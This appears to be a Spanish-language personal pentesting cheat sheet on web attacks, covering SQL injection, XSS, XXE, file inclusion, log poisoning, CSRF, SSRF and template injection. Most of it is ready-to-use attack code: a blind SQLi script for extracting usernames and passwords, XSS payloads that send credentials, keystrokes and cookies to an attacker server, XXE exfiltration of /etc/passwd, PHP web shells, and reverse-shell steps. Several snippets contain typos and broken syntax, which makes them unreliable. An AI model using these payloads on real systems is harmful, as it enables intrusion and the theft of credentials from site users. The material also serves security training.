
----
## SQLI

> Todos los sqli manuales lo tendremos en la carpeta de [PuestaenProducción](Z:\Estudios\PuestaProduccion)
> El resto lo tendremos en **sqlmap** 😁

- **Hay veces que no hace falta aplicar** `'` **porque el programador ni siquiera obligó a ponerlas, por lo que simplemente haremos la siguiente consulta.**

https://ejepmlo.com/?user_id=1 order by 1

- Poner  un valor inexistente:

https://ejepmlo.com/?user_id=52676511 order by 1

>Automatizaremos esto con el siguiente script 

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import

def def_handler(sig, frame):
	print("\n\n[!] Saliendo ... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = input("¿Cuál es la URL objetivo?: ")
parametro = input("¿Cuál es el parámetro? (Ejemplo: ?parametroExistente=ValorInexistente): ")
tabla = input("¿Cómo se llama la tabla que has encontrado?: ")
columna1 = input("¿Cómo se llama la columna de users que has encontrado?: ")
columna2 = input("¿Cómo se llama la columna de passwds que has encontrado?: ")
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta" )
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("Datos extraídos")
	
	extracted_info = ""

	for position in range(1, 150): # caracteres a corregir si nos quedamos cortos 150
		for character in range(33, 126): # empezando desde el 33 hasta el 126
		sqli_url = f"{main_url}{parametro} or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"
		#esta es la query que s ehacía an tes --> sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber los usersy passwds: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna1}, 0x3a ,{columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"
	
	# Ponerle la siguiente consulta si quiro saber los users: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna1}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber las passwds: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)

		p1.status(sqli_url)
		
		r = requests.get(sqli_url)
		
		if r.status_code == 200:
			extracted_info += chr(character)
			p2.status(extracted_info)
			break

if __name__ == '__main__':

	makeSQLI( )
```


## XSS

> Inyección JS para secuestrar el correo

- Código a inyectar

```javascript
<script>
	var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
	
	if (email == null | | email == ""){
		alert("Es necesario introducir un correo válido para visualizar el post");
	} else {
		fetch( "http://exploit_server/?email=" + email);
</script>
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80
```

> Inyección JS para secuestrar el user y passwd

- Código a inyectar

```javascript
<div id="formContainer"></div>

<script>
	var email;
	var password;
	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contraseña: <input type="password" id="password" required>' +
		'<input type="button" onclick="submitForm()" value="Submit">' +
		'</form>';

}

document.getElementByld("formContainer").innerHTML = form;

	function submitForm() {
	email = document.getElementByld("email").value;
	password = document.getElementByld("password").value;
	fetch("http://exploit_server/?email="+ email + "&password=" + password);
}

</script>
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80
```


> Keylogger con JS

- Código a inyectar

```JS
<script>
	var k = "";
	document.onkeypress = function(e){
		e = e || window. event;
		k += e.key;
		var i = new Image();
		i.src = "http://exploit_server/" + k;
	};
</script>
```

- Para escuchar poner en la terminal
```python
	python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+'
```

>Secuestrar la cookie dough sin que la víctima vea el alert

- Archivo a inyectar en entrada de texto vulnerable
```JS
<script src="http://exploit_server:puerto/powned.js"></script>
```

- Contenido de JS malicioso

```JS
var request = new XMLHttpRequest( );
request.open('GET', 'http://exploit_server/?cookie=' + document.cookie);
request.send( );
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80 
```


>Hacer que la víctima visite la página que quiero 

- Código a inyectar
```JS
<script src="http://exploit_server:puerto/powned.js"></script>
```

```JS
var request = new XMLHttpRequest( );
request.open('GET', 'http://valvonta.es/poraqui?parametro=active');
request.send( );
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80 
```

## XXE

> Utilizamos **https://github.com/jbarone/xxelab.git** para jugar

- Inyección XXE para visualizar archivo 
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY tumai SYSTEM "file:///etc/passwd"> ]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

- Inyección XXE para inyectar comandos
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY tumai SYSTEM "expect://ls"> ]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

- Inyección XXE representado en base64
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY tumai SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

- Inyección DTD external cuándo la APP no acepte entidades
> En la request
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % tumai SYSTEM "https://exploitserver.com/exploit.dtd"> %tumai;]>
<root>
	<name>sds</name>
	<tel>sdf</tel>
	<email>&tumai;</email>
	<password>sdfs</password>
</root>
```

> En nuestro **mai.dtd** 
```DTD
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % evaluamos "<!ENTITY &#x25; exfiltramos SYSTEM 'http://192.168.1.135:8089/?packssx=%file;'>">
%evaluamos;
%exfiltramos;
```


```python
python3 -m http.server 8089
```

> En la request

```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % tumai SYSTEM "http://192.168.1.135:8089/mai.dtd">  %tumai;]> 
<root><name>sds</name><tel>sdf</tel><email>packs</email><password>sdfs</password></root>
```

> Automatización de external DTD en **shellscript**

```bash
echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious dtd="""
<! ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<! ENTITY % eval \" <! ENTITY &#x25; exfil SYSTEM 'http://exploit_server/?file=%file; '>\">
%eval;
%exfil; """

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://ipaatacar:5000/rutavulnerable" -d ' <? xml version="1.0" encoding="UTF-8"?>
<! DOCTYPE foo [ <! ENTITY % xxe SYSTEM "http://exploit_server/malicious.dtd"> %xxe; ]>
<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>nasfas</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^ .* \s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
```

## Local File Inclusion - Path Traversal

>Si la web a auditar tiene el siguiente código

```php
<? php
	$filename = $_GET['filename' ];
	$filename = str_replace(" .. /", "", $filename);
	
	include("/var/www/html" . $filename . ".php");
?>
```

> Podemos intentar esto en los parámetros de entrada
```bash
/etc////.//////passwd
/etc//////////passwd
/etc/./././././passwd
/et?/passw?
/???/??a??
```

> Si tiene una versión PHP por debajo de la **5.3**
>Si el backend sanitiza así, diciendo que si las últimas 6 letras especificadas en el parámetro son passwd, no muestre nada

```php
php -r 'if(substr($argv[1],-6,6) != "passwd") include($argv[1]);' '/etc/passwd'; echo
 ```

> Podemos intentar esto

```bash
/etc/passwd/.
```

### Wrappers para LFI

> En parámetros de entrada que deduzcamos que interpreta php con **WRAPPERS**

`Http://web.com/index.php?page=course`

- Para inyectar pondríamos esto para ver el **source code**
`php://filter/convert.base64-encode/resource=index.php`

- **A partir de estos archivos vamos leyendo el resto a ver credenciales o algo más crítico**

>Lo mismo pero rota 13 posiciones las letras, por lo que si el backend sanitiza por la palabra php, no sabe qué es cuc en este caso

`http://localhost/?filename=php://filter/read=string.rot13/resource=secret.php`

![[Pasted image 20250317194631.png]]

- Para  traducir el texto
```bash
cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-0]'
```

> También tenemos esto para que el backend no lo interprete

`http://localhost/?filename=php://filter/convert.iconv.utf-8.utf-16/resource=secret.php

> Wrapper por parámetro para inyectar instrucciones en el body de una petición HTTP 

```HTTP Request
POST /?filename=php://input HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html, application/xhtml+xml, application/xml; q=0.9,image/avif,image/webp,*/ *; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate
DNT : 1
Connection: close
Cookie: PHPSESSID=8kvvf6gjk2fv05tqfsk1mjnse6
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Sec-GPC: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

<? php system("whomai"); ?>
```


>LFI con RCE

- Encodeo en **base64** lo siguiente
```php
<?php system($_GET["cmd"]); ?>
```

- Encodeo en URL los caracteres que den problemas como `+`

```HTTP
GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCk7ID8%2b%Cg==&cmd=whoami
```

> Espectacular tool que con un wrapper y encoding es capaz de ejecutar comandos, la salida del uso de l aherramienta es lo que debes copiar en el parámetro inyectable 

- [ChainGenerator](https://github.com/synacktiv/php_filter_chain_generator)
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

Salida de wrapper+encoding --> php://filter/convert.iconv.....etc
```

`http://webauditada.com/?paramInyectable=SalidaTool`

## RFI

> La Web  Interpreta la ruta de un tercero y ahí es cunado le colamos lo que queremos al ejecutarlo en la url (el archivo se debe llamar igual que lo que le server busca)

- Url  auditada

`http://web.com/?paramvulnerable=http://exploitserver.com/?wp-load.php`

- Contenido de **wp-load.php**

```php
<?php system($_GET["cmd"]); ?>
```

Una vez entablada la reverseshell
```bash
script /dev/null -c bash
ssty raw -echo ; fg # llevr netcat a 2 plano
reset xterm
ssty size # ver size de nuestra terminal
ssty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
export TERM=xterm
```

## Log Poisoning

>Debemos enumerar logs a partir de un LFI

> Si tenemos acceso a **/var/log/pache2/access.log** podemos ver contenido si la función system de PHP está habilitada en el server

- Ver info php del sitio
```bash
curl -s -X GET "http://victima.com/victima" -H User-Agent: <?php phpinfo(); ?>
```
- Ejecutar comandos
```bash
curl -s -X GET "http://victima.com/victima" -H "User-Agent: <?php system('whoami'); ?>"
```
- Ejecutar comandos en la url
1. 
```bash
curl -s -X GET "http://victima.com/victima" -H "User-Agent: <?php system(\$_GET["cmd"]); ?>"
```
2. `&cmd=whoami`

> Contaminar **Logs ssh**

- Antes era **/var/log/auth.log**
- Ahora es el archivo **/var/log/btmp**
- Debemos tener permisos de lectura en **/var/log/btmp**

1. Escapar el dólar por discrepancias en linux
```bash
ssh '<?php system(\$_GET["cmd"]); ?>'@ip
```

2. /var/log/btmp&cmd=whoami

## CRSF


>Podemos **mandar un correo en el que podemos inyectra HTML** o en una **sección de  comentarios que se pueda inyectar HTML**, o pasarle a la víctima un http://exploit_server.com/index.html que lleve lo siguiente:

```html
<img src="http://sitiowebquelemandamosalavictima.com/?edit=parametros&sexo=sexualizante" height="1" width="1" alt="Lo que aparecería en el cuerpo del correo o comentario"/>
```

## SSRF

> Desde una URL podemos visitar un host de la red interna fuzzeando su puerto, escondiendo la línea que salen 3 caracteres para que salga sólo los que tienen diferentes caracteres 

```bash
wfuzz -c -t 200 -hl 3 -z range,1-65535 'http://172.17.02/algo.php?utl=http://127.0.0.1:FUZZ
```

```bash
curl "172.17.02/algo.php?utl=http://127.0.0.1:4646/login.html"
```

> Si hay subredes también lo podemos ver pero habría que averiguarlas

```bash
curl "172.17.02/algo.php?utl=http://10.0.0.57:777/"
```

## SSTI

> Si con **whatweb** o **wappalyzer** veo **python** o **flask** que es una app que utiliza el motor **jinja2** podemos pensar que es SSTI

- Los payloads los tenemos en el repositorio de BurpsuiteTrainingLabs
- [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [MismoRepoVAriosMotores](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
- [HActricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

## CSTI (Client-Side template Injection)

1. Puede desembocar en un XSS
2. Atacaremos al cliente

> Webs

- [HackTricks-Clientside](https://book.hacktricks.wiki/es/pentesting-web/client-side-template-injection-csti.html)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md)

> Por ejemplo si tenemos el siguiente tenemos que bypassear angular encodeando la parte de Alert y ni siqquiera necesita comillas o comillas dobles aunque sea un string 😈
```JS
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

- En la consola del navegador para ver como funciona ponemos:

```JS
String.fromCharCode(97,98)
```

- Ahora hemos hecho un script para que nos lo ponga **directamente en el payload**
```python
import os

# Pedirle al usuario que ingrese la frase para el alert
frasote = input("Introduce lo que quieres pegar dentro del alert(Aqui): ")

# Crear un archivo temporal para guardar los valores ASCII
output = "/tmp/ascii_output.txt"

# Escribir los valores ASCII en el archivo con doble salto de línea
with open(output, "w") as f:
    for caracter in frasote:
        f.write(str(ord(caracter)) + "\n\n")

# Ejecutar el comando Linux para obtener los valores ASCII en una sola línea separados por comas
ascii_output = os.popen(f"cat {output} | xargs | tr ' ' ','").read().strip()

# Formatear el código JavaScript con el output embebido
js_code = f"""
{{
    c=''.sub.call;
    b=''.sub.bind;
    a=''.sub.apply;
    c.$apply=$apply;
    c.$eval=b;
    op=$root.$$phase;
    $root.$$phase=null;
    od=$root.$digest;
    $root.$digest=({{}}).toString;
    C=c.$apply(c);
    $root.$$phase=op;
    $root.$digest=od;
    B=C(b,c,b);
    $evalAsync("
    astNode=pop();
    astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert({ascii_output})))+';
    astNode.argument={{type:'Identifier',name:'foo'}};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);
    [].push.apply=m2;
    a=''.sub;
    $eval('a(b.c)');
    [].push.apply=a;
}}
"""

# Imprimir el código JavaScript con el output embebido
print(js_code)
```

----
## Padding Oracle

> Ataque contra datos cifrados que permite al atacante descifrar los datos

1. Utiliza **CBC: Cipher BlockChaining**

- Se cifra de esta manera
![[Pasted image 20250321010737.png]]